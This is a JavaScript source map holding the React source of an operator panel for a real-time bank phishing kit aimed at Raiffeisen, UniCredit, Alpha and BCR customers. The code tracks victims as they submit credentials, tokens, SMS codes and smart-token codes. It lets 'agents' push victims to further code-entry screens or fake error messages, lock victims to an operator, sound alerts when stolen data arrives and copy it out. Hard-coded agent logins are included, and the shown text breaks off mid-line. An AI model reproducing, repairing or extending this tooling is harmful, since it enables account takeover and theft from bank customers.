{"version":3,"sources":["utils/namespace-util.js","utils/constants.js","utils/utils.js","config/config.js","utils/client.js","utils/notification.js","utils/messages.js","components/UserContext.js","components/User.js","components/Users.js","components/Messages.js","components/Welcome.js","components/Auth.js","App.js","serviceWorker.js","index.js"],"names":["createNamespace","prefix","keys","Object","reduce","newKeys","key","createEnum","undefined","BankTypes","RAIFFEISEN","UNI_CREDIT","ALPHA","BCR","UserStatus","NEW","OLD","IGNORE","IMPORTANT","UserActions","ENTER_HOMEPAGE","NEW_USER","TYPING","LOGGING","SEND_CREDENTIALS","SEND_TOKEN","SEND_SMS","SEND_TECH_DATA","RAIF_SEND_AUTH_CODE","RAIF_SEND_SMART_TOKEN","RAIF_SEND_SMART_TOKEN_SMS","UNICREDIT_SEND_IMAGE","AgentInstructions","GO_TO_HOME_SCREEN","SHOW_LOADING_STATE","ERR_MSG_INVALID_CREDENTIALS","GO_TO_ORIGINAL_SITE","GO_TO_TOKEN_SCREEN","GO_TO_SMS_SCREEN","GO_TO_TECH_SCREEN","RAIF_GO_TO_AUTH_CODE_SCREEN","RAIF_GO_TO_SMART_TOKEN","RAIF_GO_TO_SMART_TOKEN_SMS","UNICREDIT_GO_TO_IMAGE","ACTIONS_TO_NOTIFY","AppStorage","JSON","parse","sessionStorage","getItem","val","setItem","stringify","id","username","password","isLockedByAgent","u","lockedBy","agent","isImportant","status","isIgnored","config","restURL","pullingInterval","REST","ajax","path","method","body","options","updateLastActive","lastActive","axios","url","data","headers","then","json","beep","Audio","fart","notify","users","messages","acc","isNewUser","play","find","msg","includes","action","isNewImportantMsg","MSG_PULLING_INTERVAL","Messaging","init","start","okCallback","errCallback","setInterval","a","send","userId","catch","e","window","alert","type","mergeUsers","oldUsers","newUsers","unread","forEach","newUser","idx","findIndex","o","push","setTimeout","user","newMsg","mapUserToMessages","isTyping","length","extra","isImportantMsg","tokens","payload","lastImportantMsgTmstp","time","ret","UserContext","createContext","UserContextProvider","props","useState","setUserId","Provider","value","children","toggleLockUser","locked","stopPropagation","agentId","User","useContext","className","onClick","description","src","height","Lock","lockedByAgent","agents","lockedByCurrentAgent","React","Component","Users","usersData","sorted","sortItems","values","filter","setFilter","filtered","filterItems","Filter","map","onChange","target","criteria","predicate","lockCriteria","importantCriteria","ignoreCriteria","sort","u1","u2","ign1","ign2","lock1","lock2","imp1","imp2","lastImportantMsgTmstp1","lastImportantMsgTmstp2","trim","toString","Messages","userData","UserMessages","Actions","Message","message","isUserMessage","UserCredentialsMessage","AgentInstructionMessage","moment","format","label","split","item","str","el","document","createElement","setAttribute","style","position","left","appendChild","select","execCommand","removeChild","copyStringToClipboard","setDescription","margin","bank","updateDescription","updateStatus","ActionWithPayload","text","setPayload","Welcome","state","console","log","oldMessages","newMessages","setState","m","this","filterUserMessages","mapUsersToMessages","Auth","isLogged","loggedAgent","logged","setLogged","Login","setUsername","setPassword","setBank","error","setError","name","defaultValue","ALFA","placeholder","authenticate","process","App","Boolean","location","hostname","match","ReactDOM","render","StrictMode","getElementById","navigator","serviceWorker","ready","registration","unregister"],"mappings":"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","file":"static/js/main.f86e74b1.chunk.js","sourcesContent":["export const createNamespace = (prefix, keys) => (\r\n  Object.keys(keys).reduce((newKeys, key) => {\r\n    newKeys[key] = prefix ? `${prefix}.${key}` : `${key}`\r\n    return newKeys\r\n  }, {})\r\n)\r\n\r\nexport const createEnum = keys => createNamespace(undefined, keys)\r\n\r\n\r\n\r\n","import { createNamespace, createEnum } from './namespace-util'\r\n\r\nexport const BankTypes = createEnum({\r\n  RAIFFEISEN: undefined,\r\n  UNI_CREDIT: undefined,\r\n  ALPHA: undefined,\r\n  BCR: undefined,\r\n})\r\n\r\nexport const UserStatus = createEnum({\r\n  NEW: undefined,\r\n  OLD: undefined,\r\n  IGNORE: undefined,\r\n  IMPORTANT: undefined,\r\n})\r\n\r\nexport const UserActions = createNamespace('USER', {\r\n  ENTER_HOMEPAGE: undefined,\r\n  NEW_USER: undefined,\r\n  TYPING: undefined,\r\n  LOGGING: undefined,\r\n  SEND_CREDENTIALS: undefined,\r\n  SEND_TOKEN: undefined,\r\n  SEND_SMS: undefined,\r\n  SEND_TECH_DATA: undefined,\r\n\r\n  RAIF_SEND_AUTH_CODE: undefined,\r\n  RAIF_SEND_SMART_TOKEN: undefined,\r\n  RAIF_SEND_SMART_TOKEN_SMS: undefined,\r\n  UNICREDIT_SEND_IMAGE: undefined,\r\n})\r\n\r\nexport const AgentInstructions = createNamespace('INSTR', {\r\n  GO_TO_HOME_SCREEN: undefined,\r\n  SHOW_LOADING_STATE: undefined,\r\n  ERR_MSG_INVALID_CREDENTIALS: undefined,\r\n  GO_TO_ORIGINAL_SITE: undefined,\r\n  GO_TO_TOKEN_SCREEN: undefined,\r\n  GO_TO_SMS_SCREEN: undefined,\r\n  GO_TO_TECH_SCREEN: undefined,\r\n\r\n  RAIF_GO_TO_AUTH_CODE_SCREEN: undefined,\r\n  RAIF_GO_TO_SMART_TOKEN: undefined,\r\n  RAIF_GO_TO_SMART_TOKEN_SMS: undefined,\r\n  UNICREDIT_GO_TO_IMAGE: undefined,\r\n})\r\n\r\nexport const CREDENTIALS_DELIMETER = ';;'\r\n\r\nexport const ACTIONS_TO_NOTIFY = [\r\n  UserActions.SEND_CREDENTIALS,\r\n  UserActions.SEND_TOKEN,\r\n  UserActions.SEND_SMS,\r\n\r\n  UserActions.RAIF_SEND_AUTH_CODE,\r\n  UserActions.RAIF_SEND_SMART_TOKEN,\r\n  UserActions.RAIF_SEND_SMART_TOKEN_SMS,\r\n  UserActions.UNICREDIT_SEND_IMAGE,\r\n]\r\n\r\n\r\n\r\n\r\n","import { UserStatus } from './constants'\r\n\r\nexport const AppStorage = {\r\n  get agent() { return 